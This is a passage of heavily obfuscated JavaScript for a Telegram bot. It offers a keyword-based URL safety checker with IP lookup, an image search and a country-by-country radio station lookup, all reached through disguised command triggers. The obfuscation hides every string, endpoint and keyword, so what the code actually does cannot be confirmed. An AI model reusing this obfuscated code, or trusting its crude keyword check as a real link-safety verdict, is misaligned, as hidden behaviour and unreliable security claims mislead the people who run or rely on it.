                                    'callback_data': _0x4c1474[_0x39eade(0x2b3)]
                                }],
                            [{
                                    'text': _0x4c1474[_0x39eade(0xd13)],
                                    'callback_data': _0x39eade(0xc6d) + _0x39eade(0x279) + _0x31e34c[_0x39eade(0x40d)]
                                }]
                        ]
                    }
                }, _0x3e6fe2 = _0x4c1474[_0x39eade(0x4be)](_0x4c1474[_0x39eade(0x4be)](_0x4c1474[_0x39eade(0x4be)](_0x4c1474[_0x39eade(0x4be)](_0x4c1474[_0x39eade(0x70d)](_0x4c1474[_0x39eade(0x4be)](_0x39eade(0x5e1) + _0x39eade(0x33a) + _0x39eade(0xa84) + _0x39eade(0x1c7) + _0x31e34c[_0x39eade(0x40d)] + '`\x0a', _0x39eade(0xb24) + '\x20' + _0x31e34c[_0x39eade(0x9ec) + 'e'] + '\x20' + _0x31e34c[_0x39eade(0x22b) + 'g'] + '\x0a'), _0x39eade(0xa2a) + _0x39eade(0xc98) + _0x31e34c[_0x39eade(0x927) + 'e'] + '\x0a'), _0x39eade(0x7c9) + _0x39eade(0x570) + m + '\x0a'), _0x39eade(0x941) + _0x39eade(0x501) + _0x31e34c[_0x39eade(0x3fc) + 'te'] + '\x0a'), _0x39eade(0x4c1) + _0x39eade(0xb9f) + _0x31e34c[_0x39eade(0xa55) + 'me'] + '\x0a'), _0x39eade(0x1a3) + _0x39eade(0x2ab) + '.');
            bot[_0x39eade(0x708) + _0x39eade(0xdb0)](_0x3e6fe2, {
                'chat_id': _0x512cf6,
                'message_id': _0x1285a3[_0x39eade(0x57f)],
                'parse_mode': _0x4c1474[_0x39eade(0x53b)],
                'reply_markup': _0xe817c6[_0x39eade(0x54f) + 'up']
            });
        } else
            bot[_0x39eade(0x741) + 'e'](_0x512cf6, _0x4c1474[_0x39eade(0xc4b)]);
    } else {
        if (_0x58d511[_0x39eade(0xd2d)](_0x4c1474[_0x39eade(0x649)])) {
            const _0x4cab4c = _0x58d511[_0x39eade(0x7aa)]('_')[-0x1ce9 * -0x1 + -0x1 * 0x1539 + 0x1 * -0x7ae], _0x1f8769 = await _0x4c1474[_0x39eade(0xc27)](getMessages, _0x4cab4c);
            if (_0x4c1474[_0x39eade(0x584)](_0x1f8769[_0x39eade(0x574)], 0xf * -0x37 + -0x582 + 0x3 * 0x2e9)) {
                let _0x237bcc = _0x1f8769[_0x39eade(0x887)](0x2 * 0xd0 + 0x1176 + -0x1316, 0x402 + 0x1 * -0x212b + -0xf1 * -0x1f)[_0x39eade(0x79b)]((_0x48d5ca, _0x2164eb) => _0x39eade(0xa18) + 'م\x20' + (_0x2164eb + (0x8 * -0x44c + -0x100 * -0x19 + 0x961)) + _0x39eade(0xc7b) + _0x48d5ca + '`')[_0x39eade(0x75e)]('\x0a\x0a');
                _0x237bcc += _0x4c1474[_0x39eade(0x7f6)], bot[_0x39eade(0x741) + 'e'](_0x512cf6, _0x237bcc, { 'parse_mode': _0x4c1474[_0x39eade(0x53b)] });
            } else
                bot[_0x39eade(0x741) + 'e'](_0x512cf6, _0x4c1474[_0x39eade(0xb44)]);
        }
    }
});
const dangerous_keywords = [
        _0x54266d(0x93b),
        _0x54266d(0xd0d),
        'gd',
        _0x54266d(0xaca),
        _0x54266d(0x7f8),
        _0x54266d(0x8eb),
        _0x54266d(0xa1b),
        _0x54266d(0x8a7),
        _0x54266d(0xae8),
        _0x54266d(0x9fd),
        _0x54266d(0xc1c),
        _0x54266d(0x64f),
        _0x54266d(0x645)
    ], safe_urls = [
        _0x54266d(0xb8c),
        _0x54266d(0x527),
        _0x54266d(0x420),
        _0x54266d(0x7fd) + _0x54266d(0x5a0),
        _0x54266d(0xd23) + _0x54266d(0x6ae),
        _0x54266d(0x5e5) + 'om',
        _0x54266d(0x752),
        _0x54266d(0xdc2),
        _0x54266d(0x38e) + 'om',
        _0x54266d(0x5b7),
        _0x54266d(0x9bf) + 'om'
    ];
let waiting_for_link = {};
function checkUrl(_0x4e16a5) {
    const _0x547d5c = _0x54266d, _0x297a4c = {
            'gpdep': _0x547d5c(0x1a1),
            'swCdV': _0x547d5c(0x1b3) + '🔴',
            'uEusX': _0x547d5c(0x5b7),
            'qbGvf': _0x547d5c(0xd1c)
        }, _0xbe53e6 = _0x4e16a5[_0x547d5c(0x4eb) + 'e']();
    for (let _0x1eb8ad of safe_urls) {
        if (_0xbe53e6[_0x547d5c(0x439)](_0x1eb8ad))
            return _0x297a4c[_0x547d5c(0xba2)];
    }
    for (let _0x3d5cfe of dangerous_keywords) {
        if (_0xbe53e6[_0x547d5c(0x439)](_0x3d5cfe))
            return _0x297a4c[_0x547d5c(0xbdc)];
    }
    if (!_0xbe53e6[_0x547d5c(0x439)](_0x297a4c[_0x547d5c(0xae3)]))
        return _0x297a4c[_0x547d5c(0xad3)];
    return _0x297a4c[_0x547d5c(0xba2)];
}
function isValidUrl(_0x3dbd19) {
    const _0x5923aa = _0x54266d, _0x258689 = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return _0x258689[_0x5923aa(0x78b)](_0x3dbd19);
}
async function getIpInfo(_0x3cb3bb) {
    const _0x425300 = _0x54266d;
    try {
        const _0x3a7e81 = await axios[_0x425300(0x4bf)](_0x425300(0x4e5) + _0x425300(0xbcb) + _0x3cb3bb + _0x425300(0x817));
        return _0x3a7e81[_0x425300(0x50f)];
    } catch (_0x42f102) {
        return null;
    }
}
function extractIpFromUrl(_0x4ef1bf) {
    const _0x2ac3af = _0x54266d, _0x4eab72 = {
            'KasQD': function (_0x542f2c, _0x3986ae) {
                return _0x542f2c(_0x3986ae);
            }
        };
    try {
        const _0x2cc5a9 = new URL(_0x4ef1bf)[_0x2ac3af(0xc9a)];
        return new Promise((_0x7d5b94, _0x2ddb78) => {
            const _0x38af41 = _0x2ac3af;
            dns[_0x38af41(0xbee)](_0x2cc5a9, (_0x3594eb, _0x1b88ab) => {
                const _0xd65cc1 = _0x38af41;
                if (_0x3594eb)
                    _0x4eab72[_0xd65cc1(0xdac)](_0x2ddb78, null);
                else
                    _0x4eab72[_0xd65cc1(0xdac)](_0x7d5b94, _0x1b88ab);
            });
        });
    } catch (_0x319951) {
        return null;
    }
}
bot[_0x54266d(0xb39)](/\/sكخزننننtart/, _0x3301b0 => {
    const _0x320951 = _0x54266d, _0x4ceee5 = {
            'FzmIt': _0x320951(0xdea) + 'ط',
            'kIGNl': _0x320951(0x7be) + 's',
            'SbLPd': _0x320951(0xc30) + _0x320951(0xc90) + _0x320951(0xc58)
        }, _0x44f0ee = _0x3301b0[_0x320951(0x6a9)]['id'], _0x4f0d1a = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x4ceee5[_0x320951(0x973)],
                            'callback_data': _0x4ceee5[_0x320951(0xd1a)]
                        }]]
            }
        };
    bot[_0x320951(0x741) + 'e'](_0x44f0ee, _0x4ceee5[_0x320951(0x8ea)], _0x4f0d1a);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x141327 => {
    const _0x186184 = _0x54266d, _0x344673 = {
            'nzPkc': function (_0x4c7ab0, _0x3fc42c) {
                return _0x4c7ab0 === _0x3fc42c;
            },
            'xfxuF': _0x186184(0x7be) + 's',
            'XFBgp': _0x186184(0x212) + _0x186184(0x81e) + _0x186184(0xae0)
        }, _0x4b26b7 = _0x141327[_0x186184(0x842)][_0x186184(0x6a9)]['id'];
    _0x344673[_0x186184(0x406)](_0x141327[_0x186184(0x50f)], _0x344673[_0x186184(0x962)]) && (bot[_0x186184(0x741) + 'e'](_0x4b26b7, _0x344673[_0x186184(0x2d9)]), waiting_for_link[_0x4b26b7] = !![]);
}), bot['on'](_0x54266d(0x842), async _0x3e069d => {
    const _0x5ed029 = _0x54266d, _0x4bfd7f = {
            'jYsQR': function (_0x245c4f, _0xa41210) {
                return _0x245c4f(_0xa41210);
            },
            'IjTVY': _0x5ed029(0xa00) + _0x5ed029(0xa43) + _0x5ed029(0x1f0),
            'SQmTJ': _0x5ed029(0x957) + _0x5ed029(0x790) + _0x5ed029(0xb28) + '%',
            'wkWNP': _0x5ed029(0x957) + _0x5ed029(0xa79) + _0x5ed029(0xd4d) + '5%',
            'EuDsg': _0x5ed029(0x957) + _0x5ed029(0x709) + _0x5ed029(0x3ce) + '0%',
            'yjvpL': _0x5ed029(0x957) + _0x5ed029(0x709) + _0x5ed029(0x20d) + '5%',
            'RyOXb': function (_0x567413, _0x3ad0e7) {
                return _0x567413(_0x3ad0e7);
            },
            'xuyrm': _0x5ed029(0x957) + _0x5ed029(0x709) + _0x5ed029(0x5f1) + _0x5ed029(0x1a2),
            'DAYnB': function (_0x495a06, _0x6641cb) {
                return _0x495a06(_0x6641cb);
            },
            'Zqbzw': function (_0x2638c3, _0x52f2c2) {
                return _0x2638c3(_0x52f2c2);
            },
            'jMqZj': function (_0x4b1676, _0xab31c0) {
                return _0x4b1676 === _0xab31c0;
            },
            'BVlaW': _0x5ed029(0x1a1),
            'kClDI': _0x5ed029(0xde6) + _0x5ed029(0xdca) + _0x5ed029(0x953) + _0x5ed029(0x7b8),
            'qnZcU': _0x5ed029(0xd1c),
            'taVtm': _0x5ed029(0x54e) + _0x5ed029(0xc6f) + _0x5ed029(0xe03) + _0x5ed029(0x241) + _0x5ed029(0x399) + _0x5ed029(0x4b5) + _0x5ed029(0x8da) + _0x5ed029(0xcf1) + _0x5ed029(0xe09) + _0x5ed029(0xaff) + _0x5ed029(0x6f5) + _0x5ed029(0x4e3) + _0x5ed029(0x22a) + _0x5ed029(0x69a) + _0x5ed029(0xd1f) + _0x5ed029(0x35b) + _0x5ed029(0xb66) + _0x5ed029(0x57a) + _0x5ed029(0x43c) + _0x5ed029(0x443) + _0x5ed029(0x615),
            'gozIY': _0x5ed029(0x1b3) + '🔴',
            'GUSvA': _0x5ed029(0x617) + _0x5ed029(0x75b) + _0x5ed029(0xb8e) + _0x5ed029(0x77c) + _0x5ed029(0x805) + _0x5ed029(0x4e1) + _0x5ed029(0xabf) + _0x5ed029(0xcd4) + _0x5ed029(0x773) + _0x5ed029(0x732) + _0x5ed029(0x278) + _0x5ed029(0xcfb) + _0x5ed029(0x7e5) + _0x5ed029(0xdcc) + _0x5ed029(0x884) + _0x5ed029(0x1c9) + _0x5ed029(0x233),
            'nquxS': function (_0x32a9c2, _0x1356ba) {
                return _0x32a9c2 || _0x1356ba;
            },
            'WlRaX': _0x5ed029(0xcff) + _0x5ed029(0x459),
            'CzUVb': _0x5ed029(0xafe)
        }, _0x121b03 = _0x3e069d[_0x5ed029(0x6a9)]['id'], _0x57a581 = _0x3e069d[_0x5ed029(0x9ac)];
    if (waiting_for_link[_0x121b03]) {
        if (!_0x4bfd7f[_0x5ed029(0x401)](isValidUrl, _0x57a581)) {
            bot[_0x5ed029(0x741) + 'e'](_0x121b03, _0x4bfd7f[_0x5ed029(0x8af)]);
            return;
        }
        let _0xa701e4 = await bot[_0x5ed029(0x741) + 'e'](_0x121b03, _0x4bfd7f[_0x5ed029(0xab2)]);
        await _0x4bfd7f[_0x5ed029(0x401)](sleep, -0xef + 0x787 + 0x908), bot[_0x5ed029(0x708) + _0x5ed029(0xdb0)](_0x4bfd7f[_0x5ed029(0x97e)], {
            'chat_id': _0x121b03,
            'message_id': _0xa701e4[_0x5ed029(0x57f)]
        }), await _0x4bfd7f[_0x5ed029(0x401)](sleep, -0x12ff + 0x11cb + 0x10d4), bot[_0x5ed029(0x708) + _0x5ed029(0xdb0)](_0x4bfd7f[_0x5ed029(0xd46)], {
            'chat_id': _0x121b03,
            'message_id': _0xa701e4[_0x5ed029(0x57f)]
        }), await _0x4bfd7f[_0x5ed029(0x401)](sleep, 0x1d * -0x42 + 0x1218 + 0x502 * 0x1), bot[_0x5ed029(0x708) + _0x5ed029(0xdb0)](_0x4bfd7f[_0x5ed029(0x512)], {
            'chat_id': _0x121b03,
            'message_id': _0xa701e4[_0x5ed029(0x57f)]
        }), await _0x4bfd7f[_0x5ed029(0xd65)](sleep, -0x1a6 * 0x12 + 0x4 * 0x55 + 0x2bf8), bot[_0x5ed029(0x708) + _0x5ed029(0xdb0)](_0x4bfd7f[_0x5ed029(0x3b1)], {
            'chat_id': _0x121b03,
            'message_id': _0xa701e4[_0x5ed029(0x57f)]
        }), await _0x4bfd7f[_0x5ed029(0xade)](sleep, -0x1a95 * -0x1 + 0x555 + -0x1c02), bot[_0x5ed029(0x802) + _0x5ed029(0x909)](_0x121b03, _0xa701e4[_0x5ed029(0x57f)]);
        const _0x583f88 = _0x4bfd7f[_0x5ed029(0x8fa)](checkUrl, _0x57a581), _0x27a76b = await _0x4bfd7f[_0x5ed029(0xd65)](extractIpFromUrl, _0x57a581), _0x12c89f = _0x27a76b ? await _0x4bfd7f[_0x5ed029(0xade)](getIpInfo, _0x27a76b) : {};
        let _0x56731c = '';
        if (_0x4bfd7f[_0x5ed029(0x3a7)](_0x583f88, _0x4bfd7f[_0x5ed029(0xa4d)]))
            _0x56731c = _0x4bfd7f[_0x5ed029(0x707)];
        else {
            if (_0x4bfd7f[_0x5ed029(0x3a7)](_0x583f88, _0x4bfd7f[_0x5ed029(0xdd4)]))
                _0x56731c = _0x4bfd7f[_0x5ed029(0x290)];
            else
                _0x4bfd7f[_0x5ed029(0x3a7)](_0x583f88, _0x4bfd7f[_0x5ed029(0xbaa)]) && (_0x56731c = _0x4bfd7f[_0x5ed029(0x18b)]);
        }
        const _0x53bc0e = _0x5ed029(0x26d) + _0x5ed029(0xd7c) + _0x57a581 + (_0x5ed029(0x3aa) + _0x5ed029(0x66b) + ':\x20') + _0x583f88 + (_0x5ed029(0x3aa) + _0x5ed029(0x738) + _0x5ed029(0x383)) + _0x56731c + (_0x5ed029(0x3aa) + _0x5ed029(0x513) + _0x5ed029(0x3e9)) + _0x4bfd7f[_0x5ed029(0xd63)](_0x27a76b, _0x4bfd7f[_0x5ed029(0xa33)]) + (_0x5ed029(0x3aa) + _0x5ed029(0x761) + _0x5ed029(0xcb0)) + (_0x12c89f[_0x5ed029(0x75a)] || _0x4bfd7f[_0x5ed029(0x6a2)]) + _0x5ed029(0x35c);
        bot[_0x5ed029(0x741) + 'e'](_0x121b03, _0x53bc0e), waiting_for_link[_0x121b03] = ![];
    } else
        bot[_0x5ed029(0x741) + 'e'](_0x121b03, '');
});
const currentSearch = {};
bot[_0x54266d(0xb39)](/\/stاههلىنححظةرلrt/, _0x2d5b63 => {
    const _0xb122eb = _0x54266d, _0x5efacd = {
            'ZOgKC': _0xb122eb(0x26c),
            'ZpCuF': _0xb122eb(0xb4f) + _0xb122eb(0x3ba),
            'xnoMs': _0xb122eb(0x684) + _0xb122eb(0xadc) + _0xb122eb(0x794) + _0xb122eb(0x9f7) + _0xb122eb(0x71a) + _0xb122eb(0xb03) + '-'
        }, _0x500921 = _0x2d5b63[_0xb122eb(0x6a9)]['id'], _0x19b951 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x5efacd[_0xb122eb(0x590)],
                            'callback_data': _0x5efacd[_0xb122eb(0x85e)]
                        }]]
            }
        };
    bot[_0xb122eb(0x741) + 'e'](_0x500921, _0x5efacd[_0xb122eb(0x7a2)], _0x19b951);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x48b37d => {
    const _0x4171a4 = _0x54266d, _0x51ae02 = {
            'BoClo': function (_0x4301c7, _0xc00a1d) {
                return _0x4301c7 === _0xc00a1d;
            },
            'iGYVJ': _0x4171a4(0xb4f) + _0x4171a4(0x3ba),
            'vJiPb': _0x4171a4(0x3e5) + _0x4171a4(0xb1c),
            'VychT': _0x4171a4(0x80d) + _0x4171a4(0xbce) + _0x4171a4(0x9dd) + _0x4171a4(0x50a) + _0x4171a4(0xad1),
            'VDqqA': _0x4171a4(0x506) + _0x4171a4(0x1d2) + _0x4171a4(0x416) + _0x4171a4(0xe11) + _0x4171a4(0x84f) + _0x4171a4(0x917) + _0x4171a4(0x30e) + _0x4171a4(0xe0c) + _0x4171a4(0x66d) + _0x4171a4(0xaaf) + _0x4171a4(0x28e) + _0x4171a4(0x95a) + _0x4171a4(0xbb4) + _0x4171a4(0xa63) + _0x4171a4(0x499) + _0x4171a4(0x94c) + _0x4171a4(0xb7c) + '\x20'
        }, _0xd66eef = _0x48b37d[_0x4171a4(0x842)][_0x4171a4(0x6a9)]['id'];
    _0x51ae02[_0x4171a4(0xa69)](_0x48b37d[_0x4171a4(0x50f)], _0x51ae02[_0x4171a4(0x558)]) && (_0x51ae02[_0x4171a4(0xa69)](currentSearch[_0xd66eef], _0x51ae02[_0x4171a4(0x464)]) ? bot[_0x4171a4(0x741) + 'e'](_0xd66eef, _0x51ae02[_0x4171a4(0x87b)]) : (bot[_0x4171a4(0x741) + 'e'](_0xd66eef, _0x51ae02[_0x4171a4(0x1b2)]), currentSearch[_0xd66eef] = _0x51ae02[_0x4171a4(0x464)]));
}), bot['on'](_0x54266d(0x842), async _0x4f1c5e => {
    const _0x506677 = _0x54266d, _0x4fadbb = {
            'qadKd': function (_0x7e8cbf, _0x2ffee1) {
                return _0x7e8cbf === _0x2ffee1;
            },
            'TIoie': _0x506677(0x3e5) + _0x506677(0xb1c),
            'ZlmIN': function (_0x3e8b78, _0x345695) {
                return _0x3e8b78(_0x345695);
            },
            'nSgwQ': function (_0x48d117, _0x4afd93) {
                return _0x48d117 === _0x4afd93;
            },
            'aEjut': _0x506677(0x66f) + _0x506677(0xe06) + _0x506677(0xe01),
            'LEHaH': function (_0x4f8aaf, _0x6ab6d9) {
                return _0x4f8aaf < _0x6ab6d9;
            },
            'TGJlh': function (_0x39a83a, _0x1ba515) {
                return _0x39a83a + _0x1ba515;
            },
            'aNzrP': _0x506677(0xb2d) + _0x506677(0x4c6) + _0x506677(0x7b3) + _0x506677(0xb2a),
            'hxbXG': function (_0x2c156c, _0x2aed1a) {
                return _0x2c156c !== _0x2aed1a;
            }
        }, _0x379145 = _0x4f1c5e[_0x506677(0x6a9)]['id'];
    if (_0x4fadbb[_0x506677(0x2f4)](currentSearch[_0x379145], _0x4fadbb[_0x506677(0xcd9)])) {
        const _0x10e633 = _0x4f1c5e[_0x506677(0x9ac)], _0x58871c = _0x506677(0x6d1) + _0x506677(0x660) + _0x506677(0x2a9) + _0x506677(0xe04) + _0x506677(0x30f) + _0x506677(0x47b) + _0x506677(0x353) + _0x506677(0x2ca) + _0x506677(0x4b3) + _0x4fadbb[_0x506677(0x38c)](encodeURIComponent, _0x10e633) + (_0x506677(0xc20) + _0x506677(0xc5a) + _0x506677(0x5f9)) + _0x4fadbb[_0x506677(0x38c)](encodeURIComponent, _0x10e633) + (_0x506677(0x339) + _0x506677(0x1c4) + _0x506677(0x8bc) + _0x506677(0x597) + _0x506677(0x791));
        try {
            const _0x379cd8 = await axios[_0x506677(0x4bf)](_0x58871c), _0x59d901 = _0x379cd8[_0x506677(0x50f)][_0x506677(0x6c2) + _0x506677(0x39c)]?.[_0x506677(0x50f)]?.[_0x506677(0x8a5)] || [];
            if (_0x4fadbb[_0x506677(0xcda)](_0x59d901[_0x506677(0x574)], 0x1676 + -0x1977 * 0x1 + 0x301 * 0x1)) {
                bot[_0x506677(0x741) + 'e'](_0x379145, _0x4fadbb[_0x506677(0x4e8)]), delete currentSearch[_0x379145];
                return;
            }
            for (let _0x2c6d4f = 0x71d + 0xc6a + 0x1 * -0x1387; _0x4fadbb[_0x506677(0x3ec)](_0x2c6d4f, _0x59d901[_0x506677(0x574)]); _0x2c6d4f++) {
                const _0x4929b = _0x59d901[_0x2c6d4f], _0x334ba8 = _0x4929b[_0x506677(0x4ec)]?.[_0x506677(0xbbb)]?.[_0x506677(0xd7a)];
                _0x334ba8 ? bot[_0x506677(0x359)](_0x379145, _0x334ba8, { 'caption': _0x506677(0xe27) + _0x4fadbb[_0x506677(0x622)](_0x2c6d4f, -0x268e + -0x1 * -0x21c1 + 0x4ce) }) : bot[_0x506677(0x741) + 'e'](_0x379145, _0x4fadbb[_0x506677(0x5d0)]);
            }
            delete currentSearch[_0x379145];
        } catch (_0x4fa171) {
            bot[_0x506677(0x741) + 'e'](_0x379145, _0x506677(0x456) + _0x4fa171[_0x506677(0x842)]), delete currentSearch[_0x379145];
        }
    } else {
        if (!currentSearch[_0x379145])
            bot[_0x506677(0x741) + 'e'](_0x379145, '');
        else
            _0x4fadbb[_0x506677(0x952)](currentSearch[_0x379145], _0x4fadbb[_0x506677(0xcd9)]) && bot[_0x506677(0x741) + 'e'](_0x379145, '');
    }
});
async function fetchRadioStationsByCountry(_0x427f0e, _0x885b4e = -0x223b + 0x1bb7 + 0x6b6) {
    const _0x349e3a = _0x54266d, _0x4c8c6b = { 'svkON': _0x349e3a(0xd37) + _0x349e3a(0x930) + _0x349e3a(0x8d0) }, _0xabcc67 = _0x349e3a(0xd94) + _0x349e3a(0x98e) + _0x349e3a(0x895) + _0x349e3a(0x65d) + _0x349e3a(0x9fa) + _0x349e3a(0x4ba) + _0x349e3a(0xba5) + _0x427f0e + _0x349e3a(0x934) + _0x885b4e;
    try {
        const _0x49be80 = await axios[_0x349e3a(0x4bf)](_0xabcc67);
        return _0x49be80[_0x349e3a(0x50f)];
    } catch (_0x48d223) {
        return console[_0x349e3a(0x3a5)](_0x4c8c6b[_0x349e3a(0x26e)], _0x48d223), [];
    }
}
const radioCountries = {
    'AE': _0x54266d(0x195),
    'SA': _0x54266d(0x53d),
    'YE': _0x54266d(0xa45),
    'EG': _0x54266d(0xbd2),
    'JO': _0x54266d(0x6a8),
    'QA': _0x54266d(0x658),
    'BH': _0x54266d(0x220),
    'KW': _0x54266d(0x31f),
    'OM': _0x54266d(0xe0e),
    'LB': _0x54266d(0x652),
    'SY': _0x54266d(0xcf0),
    'IQ': _0x54266d(0xb85),
    'MA': _0x54266d(0x1c8),
    'DZ': _0x54266d(0xc57),
    'TN': _0x54266d(0x556),
    'LY': _0x54266d(0x1f8),
    'SD': _0x54266d(0xae6),
    'PS': _0x54266d(0x2eb),
    'MR': _0x54266d(0x8fc) + _0x54266d(0x7fe),
    'SO': _0x54266d(0x4e0),
    'DJ': _0x54266d(0xba3),
    'KM': _0x54266d(0x767) + _0x54266d(0x2af),
    'AF': _0x54266d(0x333) + _0x54266d(0x4a0),
    'AL': _0x54266d(0x457),
    'AO': _0x54266d(0xd8a),
    'AR': _0x54266d(0x669) + _0x54266d(0x6bb),
    'AM': _0x54266d(0x5a5),
    'AU': _0x54266d(0xd0f),
    'AT': _0x54266d(0xd4f),
    'AZ': _0x54266d(0x5a9),
    'BD': _0x54266d(0xa44),
    'BY': _0x54266d(0xc43),
    'BE': _0x54266d(0xd99),
    'BZ': _0x54266d(0x871),
    'BJ': _0x54266d(0x1c5),
    'BO': _0x54266d(0x9b1),
    'BA': _0x54266d(0x48b) + _0x54266d(0x5ae),
    'BW': _0x54266d(0xbc9),
    'BR': _0x54266d(0xd4c),
    'BG': _0x54266d(0x53a),
    'BF': _0x54266d(0x274) + _0x54266d(0xdde),
    'KH': _0x54266d(0x28b),
    'CM': _0x54266d(0xae7) + _0x54266d(0x80f),
    'CA': _0x54266d(0x2bf),
    'CL': _0x54266d(0xbc2),
    'CN': _0x54266d(0xde3),
    'CO': _0x54266d(0x95d),
    'CR': _0x54266d(0xc29) + _0x54266d(0x5dd),
    'HR': _0x54266d(0x6ad),
    'CY': _0x54266d(0x61b),
    'CZ': _0x54266d(0x6f3),
    'DK': _0x54266d(0x829),
    'EC': _0x54266d(0x2e9) + _0x54266d(0x52e),
    'EG': _0x54266d(0xbd2),
    'SV': _0x54266d(0x539) + _0x54266d(0xc67),
    'EE': _0x54266d(0xbe1),
    'ET': _0x54266d(0x9c0),
    'FI': _0x54266d(0x693),
    'FR': _0x54266d(0xb84),
    'GE': _0x54266d(0xbf0),
    'DE': _0x54266d(0x4ef),
    'GH': _0x54266d(0x604),
    'GR': _0x54266d(0x281),
    'GT': _0x54266d(0xb00) + _0x54266d(0x5e3),
    'HN': _0x54266d(0x1a8),
    'HK': _0x54266d(0xd69) + _0x54266d(0x93f),
    'HU': _0x54266d(0x6bd),
    'IS': _0x54266d(0xda0),
    'IN': _0x54266d(0x435),
    'ID': _0x54266d(0x6d8) + _0x54266d(0x994),
    'IR': _0x54266d(0x639),
    'IE': _0x54266d(0x6e1),
    'IL': _0x54266d(0x600),
    'IT': _0x54266d(0x7e2),
    'CI': _0x54266d(0x497) + _0x54266d(0xab3),
    'JP': _0x54266d(0x6f6),
    'KZ': _0x54266d(0x882) + _0x54266d(0x365),
    'KE': _0x54266d(0x209),
    'KG': _0x54266d(0xd2b) + _0x54266d(0x6f8),
    'LV': _0x54266d(0xb1b),
    'LT': _0x54266d(0x997),
    'LU': _0x54266d(0xc3b) + _0x54266d(0x8d1),
    'MO': _0x54266d(0x5bd),
    'MY': _0x54266d(0x6ce),
    'ML': _0x54266d(0xbab),
    'MT': _0x54266d(0xa93),
    'MX': _0x54266d(0xd0c),
    'MC': _0x54266d(0x1eb),
    'MN': _0x54266d(0x835),
    'ME': _0x54266d(0x58d) + _0x54266d(0xa6b),
    'MA': _0x54266d(0x1c8),
    'MZ': _0x54266d(0xaf1),
    'MM': _0x54266d(0x63e),
    'NA': _0x54266d(0xb31),
    'NP': _0x54266d(0xa53),
    'NL': _0x54266d(0x72e),
    'NZ': _0x54266d(0xbb9) + _0x54266d(0xdc5),
    'NG': _0x54266d(0x1ac),
    'KP': _0x54266d(0xcbf) + _0x54266d(0xc9d),
    'NO': _0x54266d(0x41e),
    'PK': _0x54266d(0x883),
    'PS': _0x54266d(0x2eb),
    'PA': _0x54266d(0x892),
    'PY': _0x54266d(0x76e),
    'PE': _0x54266d(0x60e),
    'PH': _0x54266d(0x3a1),
    'PL': _0x54266d(0xd7f),
    'PT': _0x54266d(0x486),
    'PR': _0x54266d(0xd5d) + _0x54266d(0x473),
    'RO': _0x54266d(0x364),
    'RU': _0x54266d(0xc07),
    'RW': _0x54266d(0x1df),
    'SN': _0x54266d(0x99b),
    'RS': _0x54266d(0x388),
    'SG': _0x54266d(0x29f),
    'SK': _0x54266d(0x4cd),
    'SI': _0x54266d(0x641),
    'ZA': _0x54266d(0x475) + _0x54266d(0x926),
    'KR': _0x54266d(0x8e4) + _0x54266d(0xa96),
    'ES': _0x54266d(0xb54),
    'LK': _0x54266d(0x2e4),
    'SD': _0x54266d(0xae6),
    'SE': _0x54266d(0x413),
    'CH': _0x54266d(0xac4),
    'SY': _0x54266d(0xcf0),
    'TW': _0x54266d(0x294),
    'TZ': _0x54266d(0x7d7),
    'TH': _0x54266d(0x25d),
    'TG': _0x54266d(0x697),
    'TN': _0x54266d(0x556),
    'TR': _0x54266d(0x299),
    'TM': _0x54266d(0x79a) + _0x54266d(0xe2e),
    'UG': _0x54266d(0x896),
    'UA': _0x54266d(0x525),
    'AE': _0x54266d(0x195),
    'GB': _0x54266d(0x2a1),
    'US': _0x54266d(0x5e2),
    'UY': _0x54266d(0x324),
    'UZ': _0x54266d(0x74b) + _0x54266d(0x3a3),
    'VE': _0x54266d(0x4f4),
    'VN': _0x54266d(0x8c6),
    'ZM': _0x54266d(0x614),
    'ZW': _0x54266d(0x6ed),
    'GL': _0x54266d(0x519),
    'KY': _0x54266d(0x1d4) + _0x54266d(0x8f6),
    'NI': _0x54266d(0x433) + _0x54266d(0x951),
    'DO': _0x54266d(0x740) + _0x54266d(0x8c1),
    'NC': _0x54266d(0x92f) + _0x54266d(0x37d),
    'LA': _0x54266d(0x8b4),
    'TT': _0x54266d(0x191) + _0x54266d(0x8c8),
    'GG': _0x54266d(0x87c),
    'GU': _0x54266d(0xd88),
    'GP': _0x54266d(0x345),
    'MG': _0x54266d(0x305),
    'RE': _0x54266d(0xd06),
    'FO': _0x54266d(0xd9a),
    'MD': _0x54266d(0x5a4)
};
function splitRadioCountries(_0x5b01f7, _0x1c0203) {
    const _0x1ef5c2 = _0x54266d, _0x4edbc9 = {
            'FHvPa': function (_0x4f8aab, _0x35f529) {
                return _0x4f8aab < _0x35f529;
            },
            'Mexjk': function (_0x49c381, _0x2722d5) {
                return _0x49c381 + _0x2722d5;
            }
        };
    let _0x5b1593 = [];
    for (let _0x189399 = -0x1 * 0x164b + -0x2 * 0x959 + -0x5db * -0x7; _0x4edbc9[_0x1ef5c2(0x4d7)](_0x189399, _0x5b01f7[_0x1ef5c2(0x574)]); _0x189399 += _0x1c0203) {
        _0x5b1593[_0x1ef5c2(0xb97)](_0x5b01f7[_0x1ef5c2(0x887)](_0x189399, _0x4edbc9[_0x1ef5c2(0x367)](_0x189399, _0x1c0203)));
    }
    return _0x5b1593;
}
bot[_0x54266d(0xb39)](/\/staㅎrtradㅎㅗio/, _0x5e5965 => {
    const _0x40afc7 = _0x54266d, _0xc6ca64 = {
            'BmaQu': _0x40afc7(0x99e) + _0x40afc7(0xc3f) + _0x40afc7(0xcc6),
            'ccAfC': _0x40afc7(0x5d6) + _0x40afc7(0xa24) + '0',
            'yYbtx': _0x40afc7(0xdeb) + _0x40afc7(0x8d5) + _0x40afc7(0xb01) + _0x40afc7(0xce6) + _0x40afc7(0x550) + _0x40afc7(0x400) + _0x40afc7(0x33d)
        }, _0x22704d = _0x5e5965[_0x40afc7(0x6a9)]['id'], _0x47b379 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0xc6ca64[_0x40afc7(0x93e)],
                            'callback_data': _0xc6ca64[_0x40afc7(0x533)]
                        }]]
            }
        };
    bot[_0x40afc7(0x741) + 'e'](_0x22704d, _0xc6ca64[_0x40afc7(0x309)], _0x47b379);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x3cef34 => {
    const _0x290b49 = _0x54266d, _0x46e351 = {
            'LMfCi': function (_0x52f51e, _0x1c3170) {
                return _0x52f51e === _0x1c3170;
            },
